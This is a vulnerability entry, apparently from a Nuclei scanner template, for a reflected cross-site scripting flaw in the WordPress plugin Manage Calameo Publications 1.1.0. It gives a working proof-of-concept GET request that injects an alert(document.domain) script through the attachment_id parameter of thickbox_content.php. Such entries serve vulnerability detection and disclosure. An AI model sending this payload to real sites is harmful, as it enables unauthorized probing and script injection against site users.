# Nuclei Template: WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting
**Template ID:** calameo-publications-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`calameo-publications-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Manage Calameo Publications 1.1.0 is vulnerable to reflected cross-site scripting via  thickbox_content.php and the attachment_id parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26
```

## References
- https://codevigilant.com/disclosure/wp-plugin-athlon-manage-calameo-publications-a3-cross-site-scripting-xss/
- https://wpscan.com/vulnerability/83343eb3-bb4c-4b82-adf6-745882f872cc
- https://wordpress.org/plugins/athlon-manage-calameo-publications/
